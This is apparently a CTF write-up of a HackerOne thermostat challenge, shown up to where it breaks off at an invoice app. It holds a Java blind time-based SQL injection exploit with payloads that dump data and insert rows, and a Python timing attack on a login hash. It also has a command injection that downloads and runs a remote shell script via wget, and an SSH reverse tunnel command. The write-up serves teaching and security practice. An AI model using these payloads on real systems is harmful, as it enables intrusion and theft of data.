# $50 million CTF Writeup

## Summary

For a brief overview of the challenge you can take a look at the following image:

![Overview](images/Thermostat%20App%20Infrastructure.png)

Below I will detail each step that I took to solve the CTF, moreover all the bad assumptions that led me to a dead end in some cases.

## Twitter

The CTF begins with this tweet:

![Tweet](images/tweet.PNG)

### What is this binary?

![Binary](images/binary.png)

My first thought was try to decode the binary on image’s background. I also noted that after the ‘_’ character the binary numbers were repeating the same sequence, which was:

`01111010 01101100 01101001 01100010 00101011 01111000 10011100 01001011 11001010 00101100 11010001 01001011 11001001 11010111 11001111 00110000 00101100 11001001 01001000 00101101 11001010 00000101 00000000 00100101 11010010 00000101 00101001`

So let’s see if this lead to any ascii word or something readable:

```python
>>> bin_array_image = ['0b01111010', '0b01101100', '0b01101001', '0b01100010', '0b00101011', '0b01111000', '0b10011100', '0b01001011', '0b11001010', '0b00101100', '0b11010001', '0b01001011', '0b11001001', '0b11010111', '0b11001111', '0b00110000', '0b00101100', '0b11001001', '0b01001000', '0b00101101', '0b11001010', '0b00000101', '0b00000000', '0b00100101', '0b11010010', '0b00000101', '0b00101001']
>>> s = ''.join(chr(int(x,2)) for x in bin_array_image)
>>> print(s)
zlib+xKÊ,ÑKÉ×Ï0,ÉH-Ê %Ò)
```

Nice, the first five chars are: `zlib+`. So, maybe we should use zlib to decompress the remaining bytes.

```python
>>> import zlib
>>> byte_string = bytes([int(x,2) for x in bin_array_image][5:])
>>> print(zlib.decompress(byte_string))
b'bit.do/h1therm'
```

Ok. Now we have an URL that redirects to an APK file in Google Drive. Let's download it.

## APK

As my first step, I used JADX [3] to decompile the app and start to inspect the code:

![JADX](images/jadx.png)

Reading AndroidManifest.xml I could identify two activity classes: `com.hackerone.thermostat.LoginActivity` and `com.hackerone.thermostat.ThermostatActivity`.

### LoginActivity.class

The core functionality of LoginActivity is to authenticate the user:

```java
private void attemptLogin() throws Exception {
    ...
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("username", username);
    jSONObject.put("password", password);
    jSONObject.put("cmd", "getTemp");
    Volley.newRequestQueue(this).add(new PayloadRequest(jSONObject, new Listener<String>() {
        public void onResponse(String str) {
            if (str == null) {
                LoginActivity.this.loginSuccess();
                return;
            }
            LoginActivity.this.showProgress(false);
            LoginActivity.this.mPasswordView.setError(str);
            LoginActivity.this.mPasswordView.requestFocus();
        }
    }));
```

In `attemptLogin` the App builds a json object like this: `{"username": "", "password": "", "cmd": "getTemp"}` and then instantiates a  `PayloadRequest` object which will be added to a Volley Queue to be processed. So let's see what does this class do.

### PayloadRequest.class

```java
public class PayloadRequest extends Request<String> {
     public PayloadRequest(JSONObject jSONObject, final Listener<String> listener) throws Exception {
        super(1, "http://35.243.186.41/", new ErrorListener() {
            public void onErrorResponse(VolleyError volleyError) {
                listener.onResponse("Connection failed");
            }
        });
        this.mListener = listener;
        this.mParams.put("d", buildPayload(jSONObject));
    }
    ...
```

From here we could note an URL `http://35.243.186.41/` which probably is being used as the backend server. Also, there is a method called `buildPayload` which will be the value for `d` parameter.

```java
private String buildPayload(JSONObject jSONObject) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");
        byte[] bArr = new byte[16];
        new SecureRandom().nextBytes(bArr);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);
        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
        instance.init(1, secretKeySpec, ivParameterSpec);
        byte[] doFinal = instance.doFinal(jSONObject.toString().getBytes());
        byte[] bArr2 = new byte[(doFinal.length + 16)];
        System.arraycopy(bArr, 0, bArr2, 0, 16);
        System.arraycopy(doFinal, 0, bArr2, 16, doFinal.length);
        return Base64.encodeToString(bArr2, 0);
    }
```

The `buildPayload` method uses a symmetric-key algorithm [4] (AES) in CBC mode that uses the same cryptographic key for both encryption of plaintext and decryption of ciphertext. Moreover, the `secretKeySpec` is the key and PKCS#5 is the padding method. Thus our json is always sent encrypted to the backend server. Futhermore, there is a method to decript the response, called `parseNetworkResponse`, which uses the same algorithm and secret key.

### ThermostatActivity.class

The other ActivityClass is the `ThermostatActivity` which calls `setTargetTemperature` two times and updates the `thermostatModel` attribute. Also using the same json object from `LoginActivity` sends a `getTemp` command, but as you can see, does nothing with the result (`String str`)

```java
    private void setDefaults(final ThermostatModel thermostatModel) throws Exception {
        thermostatModel.setTargetTemperature(Integer.valueOf(77));
        thermostatModel.setCurrentTemperature(Integer.valueOf(76));
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("username", LoginActivity.username);
        jSONObject.put("password", LoginActivity.password);
        jSONObject.put("cmd", "getTemp");
        volleyQueue.add(new PayloadRequest(jSONObject, new Listener<String>() {
            public void onResponse(String str) {
                thermostatModel.setTargetTemperature(Integer.valueOf(70));
                thermostatModel.setCurrentTemperature(Integer.valueOf(73));
            }
        }));
    }
```

### com.hackerone.thermostat.Model.ThermostatModel

Analyzing the other classes we find a `ThermostatModel` with a `setTargetTemperatute` method which gives us another command: `setTemp`. What is interesting about this new command is that now we have a new json attributes `temp` which is the `setTemp` parameter. 

```java
    public void setTargetTemperature(Integer num) {
        this.targetTemperature.setValue(num);
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("username", LoginActivity.username);
            jSONObject.put("password", LoginActivity.password);
            jSONObject.put("cmd", "setTemp");
            jSONObject.put("temp", num);
            ThermostatActivity.volleyQueue.add(new PayloadRequest(jSONObject, new Listener<String>() {
                public void onResponse(String str) {
                }
            }));
        } catch (Exception unused) {
        }
        updateCooling();
    }
```

### Dir Brute

Why not? We have an IP running a web server so let's check if we are in a lucky day and get some low hanging fruits figuring out a hidden endpoint. Using FFUF [12]:

```bash
./ffuf -u http://35.243.186.41/FUZZ -w wordlists/SecLists/Discovery/Web-Content/big.txt
./ffuf -u http://35.243.186.41/FUZZ -w wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```

Not that easy ...

### Creating a Java Application

After this initial recon, it's time to try some attacks interacting with the backend server. For this, I just created a java application using the same source code from the App with minor changes.

```java
	public static String sendCommand(String username, String password, String cmd) throws Exception {
		return PayloadRequest.sendCommand(username, password, cmd, null);
	}
	
	public static String sendCommand(String username, String password, String cmd, String tmp) throws Exception {	
	    JSONObject jSONObject = new JSONObject();
            jSONObject.put("username", username);
            jSONObject.put("password", password);
            jSONObject.put("cmd", cmd);
            if( tmp != null) {
	        jSONObject.put("temp", tmp);
            }
            return send(jSONObject);
	}
	
	public static String send(Object jSONObject) throws Exception {
	    String payload = PayloadRequest.buildPayload(jSONObject);
            URL url = new URL("http://35.243.186.41");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
        
            Map<String, String> parameters = new HashMap<>();
            parameters.put("d", payload);
            ...
            return PayloadRequest.parseNetworkResponse(content.toString());
	}
```

So we are now able to send commands to the backend using the above `sendCommand` method. My first bet here was to try some SQL Injection. But we have some limitations as the server only returns "Invalid username or password" or "Unknown". First message is received when there is no error but the username and password does not match and the last when something went wrong. With this restriction, we could try two approaches: Time-Based Blind SQL Injection or Error-Based Blind SQL Injection. Let's try time based with the simplest payload:

```java
System.out.println(PayloadRequest.sendCommand("'||sleep(10)#", "", ""));
// After 10 seconds ...
// {"success": false, "error": "Invalid username or password"}
```

### Time Based SQL Injection

What? Did we get it? 10 seconds to get a reponse from the payload above! This is definitely my lucky day ... What I could do now? Maybe a tamper for SQLMap [9]? No, no! This is not so 31337! Let's create our own exploit for blind SQL injection... in Java! First of all, we need to somehow compare two chars and based on response time determine a boolean value: True or False. We can achieve this as follows:

```java
    public static boolean blindBoolean(String payload) throws Exception {
        long startTime = System.nanoTime();
	
	PayloadRequest.sendCommand(payload, "", "");
		
	long endTime = System.nanoTime();
	long timeElapsed = endTime - startTime;		
	return (timeElapsed / 1000000) > PayloadRequest.TIME_TO_WAIT * 1000;	
    }
```

To measure response time we get the time before and after call `sendCommand` then we subtract and compare `TIME_TO_WAIT` with the elapsed time. If elapsed time is greater than `TIME_TO_WAIT` we have a True boolean value otherwise a False value.

Now we need an abstract query for general purpose that allows us to extract data from the database:

`'||(IF((SELECT ascii(substr(column,{1},1)) from table limit {2},1){3}{4},SLEEP({5}),1))#`.

with:
```
{1} -> %d -> string char position
{2} -> row offset. Limited to 1 result per query
{3} -> %c -> comparison operator ( =, >, <)
{4} -> %d -> ascii code value
{5} -> %d -> time to sleep
```

Also to improve the performance we could use a binary search algorithm [5] for our time based boolean check:

```java
	public static String blindString(String injection, int len) throws Exception {	
	    StringBuilder value = new StringBuilder("");
	    for(int c = 1; c <= len; c++) {
	        int low = 10;
		int high = 126;
		int ort = 0;
		while(low<high) {
		    if( low-high == 1 ) {
		        ort = low + 1;
		    } else if ( low-high == -1 ) {
		        ort = low;
		    } else {
		        ort = (low+high)/2;
		    }
				
		    String payload = String.format(injection, c, '=', ort, PayloadRequest.TIME_TO_WAIT );
		    if( PayloadRequest.blindBoolean(payload) ) {
		        value.append( Character.toString( (char) ort));
		        break;
	            }
		    payload = String.format(injection, c, '>', ort, PayloadRequest.TIME_TO_WAIT );
		    if( PayloadRequest.blindBoolean(payload) ) {
		        low = ort;
	            } else {
		        high = ort;
		    }
	        }
	    }
	    return value.toString();
	}
```

Everything seems fine enough to start leaking some data:

### Database recon

#### version()
```java
	public static String blindVersion() throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(version(),%d,1)))%c%d,SLEEP(%d),1))#";
		return PayloadRequest.blindString(injection, 25);
	}
	// 10.1.37-MariaDB
```

#### database()
```java
	public static String blindDatabase() throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(database(),%d,1)))%c%d,SLEEP(%d),1))#";
		return PayloadRequest.blindString(injection, 25);
	}
	// flitebackend
```

#### hostname + datadir
```java
    System.out.println(blindString("'||(IF((SELECT ascii(substr(@@hostname,%d,1)))%c%d,SLEEP(%d),1))#", 20)); 
    // hostname: de8c6c400a9f
    System.out.println(blindString("'||(IF((SELECT ascii(substr(@@datadir,%d,1)))%c%d,SLEEP(%d),1))#", 30));
    // datadir: /var/lib/mysql/
```

#### Tables
```java
	public static String blindTableName(int offset) throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=database() limit "+offset+",1)%c%d,SLEEP(%d),1))#";
		return PayloadRequest.blindString(injection, 100);
	}
	...
	PayloadRequest.blindTableName(0); // devices
	PayloadRequest.blindTableName(1); // users
	PayloadRequest.blindTableName(2); // None
```

Two tables found: `devices` and `users` in `flitebackend` database.

#### Read files?
Maybe we could read some files?

```java
    System.out.println(blindString("'||(IF((SELECT ascii(substr(load_file('/etc/hosts'),%d,1)))%c%d,SLEEP(%d),1))#", 20));
    System.out.println(blindString("'||(IF((SELECT ascii(substr(load_file('/etc/passwd'),%d,1)))%c%d,SLEEP(%d),1))#", 20));
```
I don't think so...

#### Login
Maybe you are wondering why I didn't log in yet. But I started doing the time-based SQLi before even trying to log in. So let's see if we are able to log in using the SQLi:

```java
    System.out.println(PayloadRequest.sendCommand("' or 1=1#", "123123", "getTemp")); 
    // {"success": false, "error": "Invalid username or password"}
```

Humm, we need to think how the backend is doing the login process:
1. SELECT username, password FROM users WHERE username='+ username_param +' and password = '+ password_param +' ?
2. SELECT password FROM table WHERE username='+ username_param +'; then check password?

For 1 we already know that is not the case because using `' or 1=1#` would give us a successful message.
For 2 we need another test, first of all, let's check how many columns the query has.

```java
    System.out.println(PayloadRequest.sendCommand("' order by 1#", "", "getTemp")); 
    // {"success": false, "error": "Invalid username or password"}.
    
    System.out.println(PayloadRequest.sendCommand("' order by 2#", "", "getTemp")); 
    // {"success": false, "error": "Unknown"}
```

Ok, based on error message we can affirm that there is only one column on the query. Thus we could try to use `UNION` to fake a successful query:

```java
    System.out.println(PayloadRequest.sendCommand("' union all select ''#", "", "getTemp")); 
    // {"success": false, "error": "Invalid username or password"}
```

Not yet. There is something more... Step back and let's dump users table.

#### users table

First, we need to know the table structure. To facilitate the process I created a method called `blindColumnName` with two parameters: `table` and `offset`. This method will dump all columns names from `String table` parameter. 

```java
	public static String blindColumnName(String table, int offset) throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(column_name,%d,1)) from information_schema.columns where table_name='"+table+"' and table_schema = database() limit "+offset+",1)%c%d,SLEEP(%d),1))#";
		return PayloadRequest.blindString(injection, 100);
	}
	
	...
	PayloadRequest.blindColumnName("users",0); // id
	PayloadRequest.blindColumnName("users",1); // username
	PayloadRequest.blindColumnName("users",2); // password
	PayloadRequest.blindColumnName("users",3); // None
	
```

users(id, username, password)


#### devices table

The same process above could be applied to `devices` table.

```java
    PayloadRequest.blindColumnName("devices",0); // id
    PayloadRequest.blindColumnName("devices",1); // ip
    PayloadRequest.blindColumnName("devices",2); // None
```
devices(id, ip)

#### Dumping

Knowing the table structure we could dump the values:

```java
	public static String blindUsername(int offset) throws Exception {
	    String injection = "'||(IF((SELECT ascii(substr(username,%d,1)) from users limit "+offset+",1)%c%d,SLEEP(%d),1))#";
	    return PayloadRequest.blindString(injection, 5);
	}
	
	PayloadRequest.blindUsername(0); // admin
	PayloadRequest.blindUsername(1); // None
	
	public static String blindColumnUsersValues(String column, int length) throws Exception {
	    String injection = "'||(IF((SELECT ascii(substr("+column+",%d,1)) from users where username = 'admin')%c%d,SLEEP(%d),1))#";
	    return PayloadRequest.blindString(injection, length);
	}
	
	public static String blindPassword() throws Exception {
	    return PayloadRequest.blindColumnUsersValues("password", 32);
	}
	
	PayloadRequest.blindPassword(); // 5f4dcc3b5aa765d61d8327deb882cf99
```

There is only one user ("admin", "5f4dcc3b5aa765d61d8327deb882cf99"). Is that a hash? _Googled_ it and found the answer, yes it is: md5('password'). Now we are able to log in using admin:password or even using the sqli:

```java
    System.out.println(PayloadRequest.sendCommand("admin", "password", "getTemp"));
    // {"temperature": 73, "success": true}
    System.out.println(PayloadRequest.sendCommand("' union all select '47bce5c74f589f4867dbd57e9ca9f808'#", "aaa", "getTemp"));
    // {"temperature": 73, "success": true}
```

Time to dump table `devices`. 

```java
	public static String blindIpDevices(int offset) throws Exception {
	    String injection = "'||(IF((SELECT ascii(substr(ip,%d,1)) from devices limit "+offset+",1)%c%d,SLEEP(%d),1))#";
	    return PayloadRequest.blindString(injection, 16); // Fixed length
	}
	...
	PayloadRequest.blindIpDevices(0);
	// Device: 0	192.88.99.253
	PayloadRequest.blindIpDevices(1);
	// Device: 1	192.88.99.252
	PayloadRequest.blindIpDevices(2);
	// Device: 2	10.90.120.23
```

After obtain several ips I noted that most belonged to a private IP address block. My first idea was to build a query removing all private IP addresses and also classes D and E (see `where` clause):

```java
	public static String blindDeviceQuery() throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(ip,%d,1)) from devices where substr(ip,1,2) not in ('24', '25') and substr(ip,1,3) not in ('192', '10.', '198') limit 0,1)%c%d,SLEEP(%d),1))#";	
		return PayloadRequest.blindString(injection, 16);
	}
	
	PayloadRequest.blindDeviceQuery();
	// 104.196.12.98
```

Nice! A real IP address.

## Server 104.196.12.98

First recon step here is to run a port scan to discover if there is any service. As a result I got port 80 (http).

```
Starting masscan 1.0.6 (http://bit.ly/14GZzcT ) at 2019-03-02 22:32:46 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 22/tcp on 104.196.12.98
Discovered open port 80/tcp on 104.196.12.98
```

![Thermostat App](images/Login.png)

Now we are facing a new web application with a form consisting of `username` and `password` inputs. Also reading the source code (html) we can see that there is a `login.js`.  Let's use Burp proxy and do a request submitting the login form. What values could username and password be? From our previous SQL injection, we got admin:password. So it is a good bet:

```
POST / HTTP/1.1
Host: 104.196.12.98
Content-Length: 68

hash=3af937e7424ef6124f8b321d73a96e737732c2f5727d25c622f6047c1a4392a
```

As we can note the post is not sending username and password but a hash. Time to see what `login.js` is doing. Reading the javascript code we can spot a `hash` and a `fhash` functions, leading us to understand that it is a hash algorithm. There is also some padding and XOR bit operations. Almost sure that it is really a hash function and so the backend will be unable to get the original input values (username and password).  In this scenario we can infer that the backend will also compute the hash with the same function, as `login.js`, using the stored username + password. Then it will compare the two hashes. Therefore all we need to be authenticated is a hash.

Is it possible to be another SQL injection? Maybe another type of SQL Injection? At first, all my common payloads didn't work. So in this scenario I decided to run a SQLMap [9], remembering that we are not attacking username and password input fields, but the hash. 

```bash
$ python sqlmap.py -v 3 -u http://104.196.12.98/ --data "hash=*" --level=5 --risk=3 --random-agent
```

Result: Nothing... Maybe we could find another endpoint? Time to use dirseach [7] with some wordlists from SecList [8]:

```
# ./tools/dirsearch/dirsearch.py -b -t 10 -e php,asp,aspx,jsp,html,zip,jar,sql -x 500,503 -r -w wordlists/raft-large-words.txt -u http://104.196.12.98

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, zip, jar, sql | Threads: 10 | Wordlist size: 119600

Target: http://104.196.12.98

[15:00:31] Starting:
[15:00:35] 302 -  209B  - /update  ->  http://104.196.12.98/
[15:00:38] 302 -  209B  - /main  ->  http://104.196.12.98/
[15:00:40] 302 -  209B  - /control  ->  http://104.196.12.98/
[15:01:10] 302 -  209B  - /diagnostics  ->  http://104.196.12.98/
```

Interesting, some new endpoints to try. But unfortunately, all of them gave 302 (Found) and redirect (Location) to root (/). Therefore we need to somehow be authenticated.

Let's focus on the hash again ...

### Hash

It's a good decision to revisit the major hash attacks:

#### Hash Extension? or Hash Colision?

Could it be a hash extension vulnerability? In short hash extension occurs _when a Merkle–Damgård based hash is misused as a message authentication code with construction H(secret ‖ message), and message and the length of secret is known, a length extension attack allows anyone to include extra information at the end of the message and produce a valid hash without knowing the secret_. [10][11] In our scenario this is not applicable as there isn't a signature or message authentication code to be validated.

Or could it be a hash colision? First of all, to be a hash colision we would need a valid hash and this is not the case here.

### What to do now?

At this moment I was in a hard situation. No ideas... I was sure that something important was left behind. Consequently, I decided to go back and search for more flaws or any kind of relevant information.

#### Maybe a SSRF?

What if I could insert another IP into the devices table and use `setTemp` command to change thermostat temperature? Maybe when someone change the temperature all devices will receive a HTTP request with some authorization token and so I could use this to log in. Seems viable. First step is to try `INSERT`:

```java
System.out.println(PayloadRequest.sendCommand("';INSERT INTO devices(ip) values('X.X.X.X'); commit#", "", "getTemp"));
```
Ok, it worked. I have my IP address as a device. Now let's run tcpdump [6] on my server (X.X.X.X) to capture all network traffic. Lastly, we need to send some resquests with `getTemp` and `setTemp` commands.

`# tcpdump -i eth0 -nnvvXS`

But "nothing" happens... only a connection (port 80) from someone in San Francisco during h1-415. :) Definitively I should remove my IP address. Dead end here.

#### Create another user?

We are able to insert any device, maybe we can insert another user and use this as login and password for Thermostat Login.

```java
System.out.println(PayloadRequest.sendCommand("';INSERT INTO users(username, password) values('manoelt','e08e9df699ce8d223b8c9375471d6f0f'); commit#", "", "getTemp"));
```

No. We are not able to log in! :(

#### Another command?

And if there is another parameter? Let's brute force it!

After some time just popped up a `diag` command with the following response `{"success": false, "error": "Missing diagnostic parameters"}`. Nice, time to brute force parameters name now... After some days trying to guess the parameter for diag command using all sort of wordlists, even using cewl [13] to build specific wordlist from real Thermostats manuals, at the end nothing was found! 

### Timing Attack

Maybe I should rewrite the JS code from `login.js` to python and do a code review? Ok... So while doing code review I noted something odd on JS code:

```javascript
function hash(x) {
	x += '\x01\x00';
	while((x.length & 0xFF) != 0)
		x += String.fromCharCode((x.length & 0xFF) ^ x.charCodeAt[x.length & 0xFF]);
	...
}
```
Can you see it? This is a padding algorithm and the XOR operation is not working as expected, because of this:

`x.charCodeAt[x.length & 0xFF]`

This is a typo and this wrong piece of code probably makes the hash function unfeasible for a correct validation on the backend server, because we won't ever get the same hash value... This is a good assumption to take!

While revisting the attacks against hash functions I saw an interisting topic about Timing Attack: _"Comparing the hashes in "length-constant" time ensures that an attacker cannot extract the hash of a password in an on-line system using a timing attack, then crack it off-line_.

_The standard way to check if two sequences of bytes (strings) are the same is to compare the first byte, then the second, then the third, and so on. As soon as you find a byte that isn't the same for both strings, you know they are different and can return a negative response immediately. If you make it through both strings without finding any bytes that differ, you know the strings are the same and can return a positive result. *This means that comparing two strings can take a different amount of time depending on how much of the strings match.* "_ [1]

Time to create a PoC for a timing attack. The idea is to send each hash within the range from 0x00 to 0xFF for the first two chars, filled with `ff` until 64 chars in total (padding()). These first two chars represent a byte (hex digest) in the hash. After sending the request we save the time elapsed in a dictionary.

```python
def padding(h):
    r = h + ('f' * (64 - len(h)))
    return r
   
def send(payload):
    URL = 'http://104.196.12.98/'
    r = requests.post(URL, data={'hash':payload})
    return r.elapsed.total_seconds()
    
if __name__ == '__main__':
    times = {}
    for x in range(0,0xff):
        times[format(x, 'x').zfill(2)] = send(padding(format(x, 'x').zfill(2)))
    print(times)
```

I got:

```
{ ...
    "ef": 0.6429750000000001,
    "f0": 0.6428805,
    "f1": 0.6429075,
    "f2": 0.6429579999999999,
    "f3": 0.6426725,
    "f4": 0.6429405000000001,
    "f5": 0.6432635,
    "f6": 0.6427134999999999,
    "f7": 0.6425565,
    "f8": 0.6429004999999999,
    "f9": 1.1436354999999998,
    "fa": 0.6428285,
    "fb": 0.642867,
    "fc": 0.6430150000000001,
    "fd": 0.642695,
    "fe": 0.643376,
}
```
Note that 'f9' took 1.14 seconds, which is 0.5s more than the others. Now I should test the next two chars prefixing `f9` in the hash and so on until I got the complete hash.

#### Multithreading

Doing this timing attack in a single thread would take hours. So we need to do it using multithreading [file]. I found out that the most reliable results from my VPS network were using a maximum of 16 threads. The general idea was to build a queue with hex range 0x00 to 0xff and make each thread do a request checking the elapsed time. Being greater than 0.5s from the previous `base_value` time means that we found another "byte".

Let's just see the main function that each thread will perform:

```python
def process_data(threadName, q): # Thread main function
    global found
    while not exitFlag:   # A flag to stop all threads
        queueLock.acquire()  # Acquire Queue
        if not workQueue.empty(): 
            payload = q.get()
            queueLock.release() # Release Queue
            time_elapsed = send(payload) # Send the hash and get time_elapsed
            if len(payload) == 64 and time_elapsed == 999: # Last two chars case
                found = payload
                return
				
            while time_elapsed - base_time_value > 0.8: # Possibly a network issue
                time_elapsed = send(payload) # Try again
				
            if (time_elapsed - base_time_value) > 0.4: # Maybe we have found
                time.sleep((len(found)/2)*0.6+1)   # Waiting to confirm
				
                again = send(payload)   # Confirming
				
                if (again - base_time_value) > 0.45:
                    found = payload[:len(found)+2] # Found!
                    print('Found: ' + payload)
        else:
            queueLock.release()
            time.sleep(2)
     
```

If you have extra time you could watch all the full execution here: https://youtu.be/y50QDcvS9OM ; and a quick version here: https://youtu.be/K1-EQrj0AwA

Finally we can login using `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8` as hash.

### Thermostat web app

Now that we are authenticated we can browse the application. All the endpoints are working, except /diagnostics which gives Unauthorized. Further, under /control there is a form to change the temperature by doing a POST to /setTemp. I took some time testing this endpoint, sending all kinds of payloads, but it seemed to only accept numbers. (Note: python accepts underscore in numeric literals [14]). 

#### /update

When we access /update we get:

```
Connecting to http://update.flitethermostat:5000/ and downloading update manifest
...
...
...
Could not connect
```

Immediately this caught my eye. What if there are some hidden parameters? To do this we have a lot of options: Param Miner (Burp), Turbo Intruder (Burp), Parameth, WFuzz, FFUF and so on. As at this time I was looking for performance, I chose Turbo Intruder: _Turbo Intruder is a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results. It's intended to complement Burp Intruder by handling attacks that require exceptional speed, duration, or complexity._ [15] Attacks are configured using Python.

Request:
```
GET /update?%s HTTP/1.1
Host: 104.196.12.98
Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0
```

Python:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=40,
                           pipeline=False
                           )
...			   
    for word in open('C:\\wordlists\\backslash-powered-scanner-params.txt'):
        engine.queue(target.req, word.strip() + '=turbo.d.mydomain.com.br')
...	
def handleResponse(req, interesting):
    table.add(req)
```

Note that I just set the parameter value to `turbo.d.mydomain.com.br` which if resolved it will also be logged in my DNS. After this, I just sorted the result columns by status code, which showed me `500` for parameter `port`. Nice, we are now able to set the port. Next idea is to try changing the port to all values from 0-65535 and detect another service. Using Turbo Intruder it was easy:

```python
...
    for x in range(0,65536):
        engine.queue(target.req, x)
```

But nothing different. Let's try some injection, setting the port to `password@myserver.com:80` could lead to `http://update.flitethermostat:password@myserver.com:80/` and thus achieving a SSRF to `myserver.com`. But it didn't happen, the server returned error 500. Port was an integer parameter. Time to breath...

#### JWT

After logged in a session cookie is assigned which appears to be a flask JWT. jwt.io defines: `JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.` It also says that `JSON Web Tokens consist of three parts separated by dots (.), which are: Header.Payload.Signature .... this JSON is Base64Url encoded....`.

Base64 decoded the first part:
```
# session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0
# eyJsb2dnZWRJbiI6dHJ1ZX0
# echo -n 'eyJsb2dnZWRJbiI6dHJ1ZX0='  | base64 -d
{"loggedIn":true}
```

There is only a `loggedIn` attribute... Nevertheless I decided to extend `https://github.com/noraj/flask-session-cookie-manager`  and create a brute force to `app.secret_key` which is used to sign JWT in a flask app.

```python
...
parser_brute = subparsers.add_parser('brute', help='brute')
parser_brute.add_argument('-p', '--payload', metavar='<string>',
                            help='Cookie value', required=True)
parser_brute.add_argument('-w', '--wordlist', metavar='<string>',
                            help='Wordlist', required=True)
...
def bruteforce(payl, wordl):   
    f = open(wordl, 'r')
    for line in f:
        s = session_cookie_decoder(payl,line.strip())
        print(line.strip() +'  '+ s)
        if 'error' not in s:
            print(line.strip + ' <<<<----- KEY')
            return
...
```

Dead end!

#### _

I was forgetting something:

![Hint](images/hint.png)

Cody is the creator of the CTF. Could this be a hint? I really didn't know. But that made me try parameters with `_`:
```
update_server=test
server_host=test
host_server=test
update_host=test
```

Suddenly, I got `Connecting to http://test:5000/ and downloading update manifest`!! Yeah! So I was able to change the hostname and so do a SSRF... No, No. None of my attempts triggered a http request. What about a command injection? Using backticks (\`) I was able to inject a sleep command. Success, let's do a reverse shell:

```
GET /update?port=80&update_host=localhos`wget+http://X.X.X.X:666/shell.py+-O+/tmp/.shell.py;python+/tmp/.shell.py;rm+-rf+/tmp/.shell.py`t HTTP/1.1
Host: 104.196.12.98
Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0
```

We are inside! Where is the flag?

## Internal Server (172.28.0.3) - Invoice App

There were no flags! Doing an initial recon I noticed that I was in a docker container. And the first thing that came to my mind was CVE-2019-5736, a docker container escape to host. But I decided to look more, initially by checking the app source code at `/app/main.py` to see if there were other containers on the same network. What a surprise when I found another server at `172.28.0.3` with port 80 open. Using curl I was able to see that it was another web app, something about Hackerone invoices! 

### Tunnel

To make my life easier and to not leak what I was doing I decided to make an SSH tunnel to my server with port forwarding:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
ssh -fN  -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -R *:81:172.28.0.3:80 root@X.X.X.X -p 32777
```

The above SSH command will forward all connection to local port 81 on X.X.X.X to 172.28.0.3:80. So from this moment on, I could use all my local exploits using localhost:81 as the target. 

### Login

Browsing the web app the first thing we could see is a login form. And again my first shot was a SQL Injection, which made no sense at all. Using only a backtick would fire an exception, but I could not build a valid query. Also tried SQLMap:

```bash
# python sqlmap.py -u http://localhost:81/auth --data "username=admin&password=admin" --level=5 --risk=3
```

I also tried XPATH injection, LDAP injection and NoSQL injection. Nothing worked. Let's move on.

### New Invoice

We were also able to create invoices at `/invoices/new`. All the logic was inside `newInvoice.js`:

```javascript
function preview() {
        // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH
        //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9
        var p = encodeInvoice();
        var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);
        url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
        $('#iframe-box').empty();
        $('#iframe-box').append($('<iframe width="100%" height="500px" src="' + url + '"></iframe>'));
}

function savePDF() {
        var p = encodeInvoice();
        var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);
        url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
        var a = $('<a download href="' + url + '"><span><i>If your download does not start, click here</i></span></a>');
        $('#iframe-box').append(a);
        a.find('span').trigger('click');
}
```

Using `/invoice/preview` we get a html page with our invoice and using `/invoice/pdfize` we get a PDF with the same content. Analyzing the rest of the code I was able to send a valid request to both endpoints using curl:

```bash
curl -gv 'http://localhost:81/invoices/preview?d={"companyName":"Hackerone","email":"aaa@hackerone.com","invoiceNumber":"1","date":"2019-03-08","items":[["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"background-color":"white"}}}'; echo;

